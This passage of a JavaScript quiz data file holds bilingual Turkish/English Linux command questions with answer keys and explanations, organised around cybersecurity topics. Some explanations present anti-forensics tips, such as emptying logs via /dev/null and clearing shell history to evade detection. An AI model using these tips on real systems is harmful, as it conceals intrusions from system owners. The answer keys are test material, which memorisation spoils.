const ERR = { tr: "Sözdizimi / Komut hatası verir", en: "Syntax / Command error" };

const TOPICS = {
  "basics": {
    "tr": "Temel Komutlar & Dizinler",
    "en": "Basic Commands & Dirs"
  },
  "permissions": {
    "tr": "İzinler & Yetkiler (chmod/chown)",
    "en": "Permissions & Ownership"
  },
  "piping": {
    "tr": "Pipe & Filtreleme (grep/awk/sed)",
    "en": "Piping & Filters"
  },
  "process": {
    "tr": "Süreçler & Servisler (ps/kill)",
    "en": "Processes & Services"
  },
  "networking": {
    "tr": "Ağ Komutları & Portlar",
    "en": "Networking & Ports"
  },
  "security_recon": {
    "tr": "Siber Güvenlik: Keşif & Tarama",
    "en": "Security: Recon & Scanning"
  },
  "privesc": {
    "tr": "Siber Güvenlik: Yetki Yükseltme",
    "en": "Security: Privilege Escalation"
  },
  "forensics": {
    "tr": "Adli Bilişim & Log Analizi",
    "en": "Digital Forensics & Logs"
  },
  "crypto_tunnel": {
    "tr": "SSH, Kripto & Sheller",
    "en": "SSH, Crypto & Shells"
  },
  "bash_scripting": {
    "tr": "Bash Mantığı & Değişkenler",
    "en": "Bash Logic & Variables"
  }
};

const QUESTIONS = {
  "beginner": [
    {
      "topic": "basics",
      "code": "pwd",
      "options": [
        {
          "tr": "Geçerli çalışma dizininin mutlak yolunu yazar",
          "en": "Prints the absolute path of current working directory"
        },
        {
          "tr": "Kullanıcı parolasını değiştirir",
          "en": "Changes user password"
        },
        {
          "tr": "Mevcut dizindeki dosyaları listeler",
          "en": "Lists files in the current directory"
        },
        {
          "tr": "Sistemi yeniden başlatır",
          "en": "Reboots the system"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "pwd (Print Working Directory), terminalde o anda bulunduğun dizinin kökten (/) başlayan tam yolunu ekrana basar. Parola değiştirmek için 'passwd' kullanılır.",
        "en": "pwd (Print Working Directory) outputs the full absolute path of the current directory from root (/)."
      }
    },
    {
      "topic": "basics",
      "code": "ls -la",
      "options": [
        {
          "tr": "Sadece son oluşturulan 10 dosyayı listeler",
          "en": "Lists only the last 10 created files"
        },
        {
          "tr": "Gizli dosyalar (.) dahil tüm dosyaları izin ve boyut detaylarıyla listeler",
          "en": "Lists all files including hidden (.) with permissions and sizes"
        },
        {
          "tr": "Tüm dizini kalıcı olarak temizler",
          "en": "Permanently deletes the entire directory"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 1,
      "explanation": {
        "tr": "-a (all) parametresi nokta (.) ile başlayan gizli dosyaları (.bashrc, .ssh, .bash_history) gösterir. Siber güvenlikte saldırganlar veya CTF soruları gizli dizin ve dosyaları sıklıkla kullanır. -l ise izinler ve sahiplik detayını verir.",
        "en": "-a (all) reveals hidden files starting with a dot (.bash_history, .ssh), crucial in security recon. -l provides long format detailing permissions."
      }
    },
    {
      "topic": "basics",
      "code": "cd ~",
      "options": [
        {
          "tr": "Kök dizine (/) gider",
          "en": "Navigates to root directory (/)"
        },
        {
          "tr": "Mevcut kullanıcının ev dizinine (/home/kullanıcı) gider",
          "en": "Navigates to current user's home directory (/home/user)"
        },
        {
          "tr": "Bir önceki çalışma dizinine geri döner",
          "en": "Returns to previous working directory"
        },
        {
          "tr": "Masaüstüne gider",
          "en": "Navigates to Desktop"
        }
      ],
      "answer": 1,
      "explanation": {
        "tr": "Tilde (~) işareti mevcut oturum açmış kullanıcının ev (home) dizinini temsil eder (kali kullanıcısı için /home/kali, root için /root). Bir önceki dizine dönmek için 'cd -' kullanılır.",
        "en": "The tilde (~) represents the current user's home directory. 'cd -' switches to the previous directory."
      }
    },
    {
      "topic": "permissions",
      "code": "chmod 755 script.sh",
      "options": [
        {
          "tr": "Sahip: rwx, Grup: r-x, Diğerleri: r-x",
          "en": "Owner: rwx, Group: r-x, Others: r-x"
        },
        {
          "tr": "Sahip: r--, Grup: r--, Diğerleri: r--",
          "en": "Owner: r--, Group: r--, Others: r--"
        },
        {
          "tr": "Tüm kullanıcılara tam yetki (rwx) verir",
          "en": "Gives full permissions (rwx) to all users"
        },
        {
          "tr": "Dosyayı salt okunur yapar",
          "en": "Makes the file read-only"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Linux izinlerinde r=4, w=2, x=1'dir. 7 = 4+2+1 (okuma, yazma, çalıştırma). 5 = 4+1 (okuma ve çalıştırma). Dolayısıyla 755: Sahibe tam yetki, grup ve diğerlerine ise sadece okuma+çalıştırma verir.",
        "en": "r=4, w=2, x=1. 7 = 4+2+1 (rwx), 5 = 4+1 (r-x). Thus 755 grants owner full access, while group and others can read and execute."
      }
    },
    {
      "topic": "permissions",
      "code": "chmod 600 id_rsa",
      "options": [
        {
          "tr": "SSH özel anahtarına sadece dosya sahibinin okuma ve yazma (rw-) yapmasını sağlar",
          "en": "Allows only file owner read and write (rw-) on SSH private key"
        },
        {
          "tr": "Herkesin dosyayı çalıştırmasını sağlar",
          "en": "Allows everyone to execute the file"
        },
        {
          "tr": "Dosyayı parola korumalı hale getirir",
          "en": "Password-protects the file"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Siber güvenlikte SSH özel anahtarları (id_rsa) asla grup veya başkaları tarafından okunabilir olmamalıdır. SSH istemcisi izinleri 600 (rw-------) olmayan anahtarları 'Permissions are too open' diyerek reddeder.",
        "en": "SSH rejects private keys with open permissions. 600 ensures strictly the owner has read and write access, blocking groups and others."
      }
    },
    {
      "topic": "basics",
      "code": "echo \"admin:password123\" > creds.txt\necho \"root:toor\" >> creds.txt\nwc -l < creds.txt",
      "options": [
        "1",
        "2",
        "0",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 1,
      "explanation": {
        "tr": "> operatörü dosyayı sıfırlayarak yazar, >> operatörü ise dosyanın sonuna ekleme yapar (append). İlk satır yazıldıktan sonra ikinci satır eklendiği için dosyada toplam 2 satır olur. wc -l ise satır sayısını verir.",
        "en": "> creates or overwrites the file, while >> appends to it. The file contains 2 lines, so wc -l outputs 2."
      }
    },
    {
      "topic": "process",
      "code": "whoami",
      "options": [
        {
          "tr": "Oturum açmış olan aktif kullanıcının adını yazar",
          "en": "Prints the username of the active session"
        },
        {
          "tr": "Bilgisayarın IP adresini verir",
          "en": "Outputs the computer's IP address"
        },
        {
          "tr": "Sistemdeki tüm kayıtlı kullanıcıları listeler",
          "en": "Lists all registered users on system"
        },
        {
          "tr": "Bilgisayarın ağ adını (hostname) verir",
          "en": "Outputs the network hostname"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "whoami komutu o anki terminal kabuğunu çalıştıran geçerli kullanıcının adını verir. Bir pentest veya CTF sırasında 'root' olup olmadığını doğrulamak için ilk çalıştırılan komutlardandır.",
        "en": "whoami returns the current user context. It is universally run after privilege escalation to verify if root is achieved."
      }
    },
    {
      "topic": "basics",
      "code": "id",
      "options": [
        {
          "tr": "Kullanıcının UID, GID ve üye olduğu grupları gösterir",
          "en": "Displays UID, GID and group memberships of the current user"
        },
        {
          "tr": "Ağ arayüzünün MAC adresini gösterir",
          "en": "Displays the network interface MAC address"
        },
        {
          "tr": "İşlemcinin seri numarasını verir",
          "en": "Outputs the CPU serial number"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "'id' komutu kullanıcının sayısal kimliğini (uid), ana grup kimliğini (gid) ve dahil olduğu ek grupları (sudo, docker, lxd vb.) listeler. Docker veya lxd grubunda olmak siber güvenlikte doğrudan yetki yükseltme (privesc) vektörüdür!",
        "en": "'id' reveals UID, GID, and supplementary groups (sudo, docker, lxd). Group memberships like 'docker' provide direct privilege escalation pathways."
      }
    },
    {
      "topic": "basics",
      "code": "head -n 2 /etc/passwd | wc -l",
      "options": [
        "0",
        "2",
        "10",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 1,
      "explanation": {
        "tr": "head -n 2 dosyanın ilk 2 satırını alır. Pipe (|) ile bu 2 satır wc -l (word count - lines) komutuna aktarılır ve sonuç 2 olur.",
        "en": "head -n 2 extracts the first 2 lines. Piping to wc -l yields 2."
      }
    },
    {
      "topic": "basics",
      "code": "tail -n 3 /var/log/messages",
      "options": [
        {
          "tr": "Log dosyasının ilk 3 satırını gösterir",
          "en": "Displays first 3 lines of the log"
        },
        {
          "tr": "Log dosyasının son 3 satırını gösterir",
          "en": "Displays last 3 lines of the log"
        },
        {
          "tr": "Dosyayı 3 parçaya böler",
          "en": "Splits file into 3 parts"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 1,
      "explanation": {
        "tr": "tail komutu bir dosyanın son satırlarını görüntüler. Siber güvenlikte log takibi yaparken canlı izlemek için 'tail -f /var/log/auth.log' komutu çok sık kullanılır.",
        "en": "tail displays the ending lines of a file. 'tail -f' is widely used in forensics to monitor logs in real-time."
      }
    },
    {
      "topic": "basics",
      "code": "touch exploit.py",
      "options": [
        {
          "tr": "exploit.py dosyasını Python ile çalıştırır",
          "en": "Executes exploit.py with Python"
        },
        {
          "tr": "Dosya yoksa boş olarak oluşturur; varsa son erişim/değiştirilme zamanını günceller",
          "en": "Creates empty file if missing, updates timestamps if it exists"
        },
        {
          "tr": "Dosyanın kod hatalarını analiz eder",
          "en": "Analyzes code errors in file"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 1,
      "explanation": {
        "tr": "touch komutu dosya mevcut değilse boş bir dosya oluşturur; dosya zaten varsa içeriğe dokunmadan son erişim (atime) ve değiştirilme (mtime) zaman damgasını günceller.",
        "en": "touch creates an empty file if non-existent, or refreshes access/modification timestamps without modifying contents."
      }
    },
    {
      "topic": "basics",
      "code": "mkdir -p /tmp/recon/subdomains/active",
      "options": [
        {
          "tr": "Tüm ara dizinlerle birlikte hiyerarşik dizin yapısını tek seferde oluşturur",
          "en": "Creates the entire nested directory tree in one command"
        },
        {
          "tr": "Var olan dizinleri silip yenisini açar",
          "en": "Deletes existing directories and recreates them"
        },
        {
          "tr": "Dizini parola ile şifreler",
          "en": "Password-encrypts directory"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-p (parents) parametresi aradaki üst dizinler (recon, subdomains) henüz var olmasa bile hata vermeden sırayla hepsini oluşturur.",
        "en": "-p (parents) automatically creates parent directories as needed without failing if they already exist."
      }
    },
    {
      "topic": "basics",
      "code": "rm -rf /tmp/target_data",
      "options": [
        {
          "tr": "Hedef dizini ve içindeki tüm dosya/alt dizinleri onay sormadan zorla siler",
          "en": "Recursively and forcefully deletes directory and all contents without confirmation"
        },
        {
          "tr": "Dizini geri dönüşüm kutusuna taşır",
          "en": "Moves directory to trash"
        },
        {
          "tr": "Sadece boş dizinleri temizler",
          "en": "Removes only empty directories"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-r (recursive) dizin ağacını derinlemesine gezer, -f (force) ise yazma korumalı dosyalarda bile onay sormadan siler. Linux'ta silinen dosyalar geri dönüşüm kutusuna gitmez, kalıcı olarak silinir!",
        "en": "-r recursively traverses, and -f forces deletion without confirmation prompts. Linux deletions bypass any recycle bin."
      }
    },
    {
      "topic": "basics",
      "code": "uname -a",
      "options": [
        {
          "tr": "Çekirdek (kernel) adı, sürümü, mimarisi ve makine adını detaylıca yazar",
          "en": "Prints kernel name, version, architecture and hostname"
        },
        {
          "tr": "Kullanıcının adını ve parolasını ekrana basar",
          "en": "Prints username and password"
        },
        {
          "tr": "Ağdaki tüm aktif cihazları tarar",
          "en": "Scans all active network devices"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "uname -a (all) Linux çekirdek sürümünü (örneğin 5.10.0-kali7-amd64) ve mimariyi (x86_64) gösterir. Siber güvenlikte sistemdeki kernel exploit (Dirty COW, Dirty Pipe vb.) açığını tespit etmek için ilk bakılan çıktıdır.",
        "en": "uname -a reveals Linux kernel release and architecture. Crucial in cybersecurity for identifying known kernel vulnerabilities like Dirty Pipe."
      }
    },
    {
      "topic": "piping",
      "code": "grep -i \"root\" /etc/passwd",
      "options": [
        {
          "tr": "Büyük/küçük harf duyarsız (case-insensitive) olarak 'root' içeren satırları bulur",
          "en": "Finds lines containing 'root' ignoring case distinctions"
        },
        {
          "tr": "Sadece tam eşleşen kelimeleri arar",
          "en": "Matches exact whole words only"
        },
        {
          "tr": "root kullanıcısının şifresini değiştirir",
          "en": "Changes root password"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "grep'te -i parametresi büyük/küçük harf ayrımını kaldırır (case-insensitive). 'ROOT', 'Root', 'root' hepsi eşleşir.",
        "en": "-i instructs grep to ignore case, matching 'Root', 'ROOT', and 'root'."
      }
    },
    {
      "topic": "basics",
      "code": "cat /etc/issue",
      "options": [
        {
          "tr": "Sistem dağıtım adını ve versiyonunu (ör. Kali GNU/Linux Rolling) gösterir",
          "en": "Displays Linux distro name and release (e.g. Kali GNU/Linux Rolling)"
        },
        {
          "tr": "Sistemdeki güvenlik açıklarını raporlar",
          "en": "Reports security vulnerabilities"
        },
        {
          "tr": "Donanım arızalarını listeler",
          "en": "Lists hardware issues"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "/etc/issue login öncesi gösterilen dağıtım tanıtım metnidir. Hızlıca dağıtımın Debian, Kali, Ubuntu veya RedHat olduğunu anlamak için kontrol edilir.",
        "en": "/etc/issue displays system identification information before login prompt."
      }
    },
    {
      "topic": "networking",
      "code": "ping -c 1 127.0.0.1 > /dev/null\necho $?",
      "options": [
        "0",
        "1",
        "127",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "127.0.0.1 yerel geri döngü (loopback) adresidir ve her zaman ping'e yanıt verir. Başarılı komutlar Linux'ta 0 (sıfır) çıkış kodu (exit code) döndürür. $? son komutun durum kodunu verir.",
        "en": "Loopback 127.0.0.1 responds successfully. In Linux, successful execution returns exit code 0, read via $?."
      }
    },
    {
      "topic": "piping",
      "code": "cat << 'EOF'\n$USER\nEOF",
      "options": [
        "$USER",
        {
          "tr": "kali (veya geçerli kullanıcı adı)",
          "en": "kali (or current username)"
        },
        {
          "tr": "Boş satır",
          "en": "Empty line"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Heredoc yapısında sınır belirteci ('EOF') tırnak içine alındığında değişken genişletmesi (variable expansion) devre dışı kalır. Bu nedenle $USER değişkeni yorumlanmaz, doğrudan metin olarak $USER yazdırılır.",
        "en": "Quoting the delimiter in a heredoc ('EOF') disables variable expansion, printing literal $USER."
      }
    },
    {
      "topic": "basics",
      "code": "which python3",
      "options": [
        {
          "tr": "python3 çalıştırılabilir dosyasının PATH içindeki tam yolunu (/usr/bin/python3) verir",
          "en": "Returns the full path of python3 in PATH (/usr/bin/python3)"
        },
        {
          "tr": "Python versiyon numarasını ekrana basar",
          "en": "Prints Python version number"
        },
        {
          "tr": "Python kütüphanelerini listeler",
          "en": "Lists Python libraries"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "'which' komutu, parametre olarak verilen komutun sistemin PATH değişkeninde nerede bulunduğunu arar ve ilk bulunan dosyanın mutlak yolunu verir.",
        "en": "'which' searches PATH environment variable and prints the absolute path of the executable."
      }
    },
    {
      "topic": "permissions",
      "code": "chmod +x payload.sh\nls -l payload.sh | cut -c4",
      "options": [
        "x",
        "r",
        "w",
        "-"
      ],
      "answer": 0,
      "explanation": {
        "tr": "+x ile dosyaya çalıştırma yetkisi verilir. 'ls -l' çıktısının ilk karakteri dosya tipidir (-), sonraki 3 karakter sahip yetkileridir (rwx). 4. karakter sahibin 'x' (execute) yetkisidir.",
        "en": "+x adds execute bit. In 'ls -l', 4th character represents owner's execute permission 'x'."
      }
    },
    {
      "topic": "basics",
      "code": "echo 'hello world' | wc -w",
      "options": [
        "2",
        "11",
        "1",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "wc (word count) komutuna verilen -w parametresi kelime sayısını verir. 'hello world' 2 kelimeden oluşur.",
        "en": "wc -w counts words. 'hello world' contains 2 words."
      }
    },
    {
      "topic": "basics",
      "code": "cat /dev/null > secret.log\nwc -c < secret.log",
      "options": [
        "0",
        "1",
        {
          "tr": "Dosya silinir",
          "en": "File is deleted"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "/dev/null özel bir aygıt dosyasıdır (bit bucket/karadelik) ve boştur. İçeriğini bir dosyaya yönlendirmek o dosyayı silmeden boyutunu sıfır bayta (0) indirir. Siber güvenlikte log temizleme taktiğidir.",
        "en": "Redirecting /dev/null empties the file without deleting it. Byte size (wc -c) becomes 0."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "VAR=\"kali\"\necho '$VAR'",
      "options": [
        "$VAR",
        "kali",
        {
          "tr": "Hata verir",
          "en": "Throws an error"
        },
        {
          "tr": "Boş çıktı",
          "en": "Empty output"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Bash kabuğunda tek tırnak ('...') içindeki her şeyi saf metin olarak kabul eder ve değişkenleri genişletmez. Çift tırnak (\"...\") olsaydı 'kali' yazdırılırdı.",
        "en": "Single quotes prevent variable expansion in Bash, producing literal '$VAR'."
      }
    },
    {
      "topic": "basics",
      "code": "history -c",
      "options": [
        {
          "tr": "Mevcut kabuk oturumunun komut geçmişini temizler",
          "en": "Clears current shell session command history"
        },
        {
          "tr": "Tüm komut geçmişini ekrana yazdırır",
          "en": "Prints all command history"
        },
        {
          "tr": "Komut geçmişini bir dosyaya kaydeder",
          "en": "Saves command history to file"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "history -c (clear) bellekteki komut geçmişini temizler. Saldırganlar veya pentester'lar sisteme girdikten sonra arkalarında iz bırakmamak için geçmişi temizlerler.",
        "en": "history -c clears in-memory history, commonly utilized post-exploitation to evade detection."
      }
    },
    {
      "topic": "basics",
      "code": "file /bin/bash | grep -o 'ELF'",
      "options": [
        "ELF",
        "ASCII",
        "Python",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Linux'taki çalıştırılabilir ikili dosyalar (executable binary) Windows'taki PE/EXE gibi 'ELF' (Executable and Linkable Format) başlığı taşır. 'file' komutu bunu tespit eder.",
        "en": "Linux executables use ELF (Executable and Linkable Format). 'file /bin/bash' identifies it as an ELF binary."
      }
    }
  ],
  "intermediate": [
    {
      "topic": "piping",
      "code": "cut -d: -f1 /etc/passwd | grep -E '^root$'",
      "options": [
        "root",
        "root:x:0:0::/root:/bin/bash",
        "/bin/bash",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-d: iki nokta üst üste (:) karakterini ayraç yapar, -f1 ise birinci sütunu (kullanıcı adlarını) çeker. grep '^root$' ise tam olarak sadece 'root' kelimesini süzer.",
        "en": "cut -d: -f1 splits by ':' and extracts the first field (usernames). grep '^root$' matches 'root' precisely."
      }
    },
    {
      "topic": "privesc",
      "code": "awk -F: '$3 == 0 {print $1}' /etc/passwd",
      "options": [
        {
          "tr": "Sistemde UID değeri 0 olan (root yetkisine sahip) tüm hesapların kullanıcı adlarını listeler",
          "en": "Lists usernames of all accounts with UID 0 (root-equivalent privilege)"
        },
        {
          "tr": "Parolası olmayan kullanıcıları listeler",
          "en": "Lists users with no passwords"
        },
        {
          "tr": "Kilitlenmiş tüm hesapları kapatır",
          "en": "Locks all disabled accounts"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "/etc/passwd dosyasında 3. alan Kullanıcı Kimliğidir (UID). UID 0 doğrudan en üst yetkili root hesabına aittir. Sistemde root dışında başka bir hesabın UID'si 0 ise bu gizli bir arka kapıdır (backdoor).",
        "en": "Field 3 is the UID. UID 0 grants superuser authority. Finding non-root accounts with UID 0 is a vital backdoor detection check."
      }
    },
    {
      "topic": "networking",
      "code": "ss -tulpn",
      "options": [
        {
          "tr": "Sistemde dinleme (LISTEN) durumunda olan TCP ve UDP portlarını ve bunları açan işlem (PID) adlarını listeler",
          "en": "Lists listening TCP and UDP sockets along with their process names and PIDs"
        },
        {
          "tr": "Kablosuz ağ şifrelerini kırar",
          "en": "Cracks wireless Wi-Fi passwords"
        },
        {
          "tr": "Ağdaki paketleri dosya olarak kaydeder",
          "en": "Saves network packets to pcap file"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "ss (socket statistics), modern Linux'ta netstat yerine geçer. -t (tcp), -u (udp), -l (listening), -p (processes), -n (numeric ports). Saldırganın açtığı ters kabuk veya arka kapı portlarını bulmada esastır.",
        "en": "ss -tulpn displays listening TCP/UDP ports and their associated PIDs. Indispensable for discovering open backdoor listeners."
      }
    },
    {
      "topic": "process",
      "code": "kill -9 1337",
      "options": [
        {
          "tr": "1337 PID numaralı sürece SIGKILL sinyali gönderip süreci anında zorla sonlandırır",
          "en": "Sends SIGKILL signal to PID 1337, forcefully terminating it immediately"
        },
        {
          "tr": "1337 numaralı portu kapatır",
          "en": "Closes port 1337"
        },
        {
          "tr": "1337 numaralı kullanıcıyı sistemden siler",
          "en": "Deletes user with UID 1337"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Sinyal 9 (SIGKILL), sürecin yakalayamayacağı veya yok sayamayacağı doğrudan çekirdek seviyesinde zorla öldürme sinyalidir. Normal sonlandırma sinyali ise 15'tir (SIGTERM).",
        "en": "Signal 9 is SIGKILL, uncatchable by the process and terminating it instantly. Signal 15 (SIGTERM) allows graceful shutdown."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "echo -n \"kali:root\" | base64",
      "options": [
        "a2FsaTpyb290",
        "kali:root",
        "MD5 hash",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "base64 bir şifreleme değil, ikili veriyi ASCII metne dönüştüren bir kodlama (encoding) algoritmasıdır. 'kali:root' dizgisi Base64 formatında 'a2FsaTpyb290' olur. HTTP Basic Authentication başlıklarında kullanılır.",
        "en": "Base64 encodes binary to text, frequently observed in HTTP Basic Auth headers. 'kali:root' encodes to 'a2FsaTpyb290'."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "echo -n \"a2FsaTpyb290\" | base64 -d",
      "options": [
        "kali:root",
        "a2FsaTpyb290",
        "error",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-d (decode) parametresi Base64 ile kodlanmış metni çözer ve orijinal haline ('kali:root') geri getirir.",
        "en": "-d (decode) reverses base64 encoding back to plain text."
      }
    },
    {
      "topic": "piping",
      "code": "cat /var/log/auth.log | grep -i \"failed\" | wc -l",
      "options": [
        {
          "tr": "auth.log dosyasında 'failed' kelimesi geçen satır sayısını (başarısız giriş denemeleri) verir",
          "en": "Counts lines in auth.log containing 'failed' (failed authentication attempts)"
        },
        {
          "tr": "Sisteme sızan kullanıcıların IP adreslerini engeller",
          "en": "Blocks IP addresses of attackers"
        },
        {
          "tr": "Sistem parolasını sıfırlar",
          "en": "Resets system passwords"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "auth.log Debian/Kali/Ubuntu'da kimlik doğrulama loglarını tutar. 'failed' kayıtlarını filtreleyip saymak, bir SSH parola kaba kuvvet (brute-force) saldırısı olup olmadığını anlamanın en hızlı yoludur.",
        "en": "auth.log tracks auth events. Filtering 'failed' and piping to wc -l instantly indicates whether brute force attempts are underway."
      }
    },
    {
      "topic": "networking",
      "code": "nc -zv 192.168.1.50 22 80",
      "options": [
        {
          "tr": "Verilen IP adresindeki 22 ve 80 numaralı portların açık olup olmadığını veri göndermeden yoklar (port taraması)",
          "en": "Probes if ports 22 and 80 on target IP are open without sending payload (port scan)"
        },
        {
          "tr": "Hedef makineye doğrudan root shell açar",
          "en": "Opens an instant root shell on target"
        },
        {
          "tr": "Hedefe ping atar",
          "en": "Pings the target"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Netcat'in -z parametresi 'Zero-I/O' (bağlantı kurulur kurulmaz veri iletmeden kapat, sadece port açık mı test et), -v ise ayrıntılı (verbose) çıktı modudur. Hızlı bir port tarayıcısı gibi çalışır.",
        "en": "nc -z (Zero-I/O) tests if ports are open without sending data, coupled with -v (verbose) for clear scanning feedback."
      }
    },
    {
      "topic": "networking",
      "code": "curl -I https://example.com | grep -i '^server:'",
      "options": [
        {
          "tr": "Web sunucusunun HTTP başlığındaki 'Server' banner bilgisini (ör. Server: nginx/1.18.0) filtreler",
          "en": "Extracts web server HTTP 'Server' banner header (e.g. Server: nginx/1.18.0)"
        },
        {
          "tr": "Web sitesinin tüm kaynak kodunu indirir",
          "en": "Downloads entire website source code"
        },
        {
          "tr": "Web sunucusuna DDoS saldırısı başlatır",
          "en": "Launches DDoS attack on web server"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "curl'e verilen -I parametresi HTTP HEAD isteği atarak sadece başlıkları (headers) alır. Siber güvenlikte keşif (recon) aşamasında hedef sunucunun yazılımını ve sürümünü öğrenmek için kullanılır.",
        "en": "curl -I issues a HEAD request fetching response headers. Crucial for reconnaissance to extract server technology banners."
      }
    },
    {
      "topic": "process",
      "code": "ps aux | grep -v grep | grep apache2 | wc -l",
      "options": [
        {
          "tr": "Çalışmakta olan gerçek apache2 süreçlerinin sayısını verir (grep işlemini saymadan)",
          "en": "Counts active apache2 processes excluding the grep command itself"
        },
        {
          "tr": "Apache sunucusunu yeniden başlatır",
          "en": "Restarts Apache server"
        },
        {
          "tr": "Apache loglarını temizler",
          "en": "Clears Apache logs"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "'grep apache2' çalıştırıldığında grep komutunun kendisi de işlem listesinde göründüğü için 'grep -v grep' ile grep komutu filtreden çıkarılır, böylece doğru süreç sayısı elde edilir.",
        "en": "'grep -v grep' excludes grep itself from ps results to get an accurate process count."
      }
    },
    {
      "topic": "piping",
      "code": "sort numbers.txt | uniq -c",
      "options": [
        {
          "tr": "Her benzersiz satırın kaç kez tekrarlandığını sayısıyla birlikte yazar",
          "en": "Outputs unique lines preceded by their occurrence count"
        },
        {
          "tr": "Tüm dosyadaki sayıları toplar",
          "en": "Sums all numbers in file"
        },
        {
          "tr": "Dosyadaki çift satırları siler",
          "en": "Deletes even-numbered lines"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "uniq komutu sadece bitişik tekrarları yakalar, bu yüzden önce sort ile sıralanır. -c (count) her satırın başına kaç adet olduğunu yazar (ör. 5 192.168.1.1). Log analizinde en çok istek atan IP'leri bulmak için standarttır.",
        "en": "uniq requires sorted input. -c prefixes lines with occurrence counts, a staple pattern for detecting top attacker IPs."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "true && false || echo \"Hacked\"",
      "options": [
        "Hacked",
        "false",
        "true",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "&& (AND) solundaki komut başarılı (exit 0) ise sağındakini çalıştırır. 'true && false' false ile sonuçlanır. || (OR) ise solundaki komut başarısız olduğunda sağındakini çalıştırır. Sonuç 'Hacked' yazdırılır.",
        "en": "&& proceeds on success, while || proceeds on failure. Since 'false' fails, || triggers echo 'Hacked'."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "false && echo \"A\"; echo $?",
      "options": [
        "1",
        "0",
        "A",
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "false komutu 1 durum koduyla çıkar, bu yüzden && sonrasındaki echo çalıştırılmaz. Ancak zincirin son komutu false olduğu için $? son durum kodu olarak 1 değerini basar.",
        "en": "false returns exit code 1. Because of &&, echo 'A' does not run. $? reflects the non-zero failure exit code 1."
      }
    },
    {
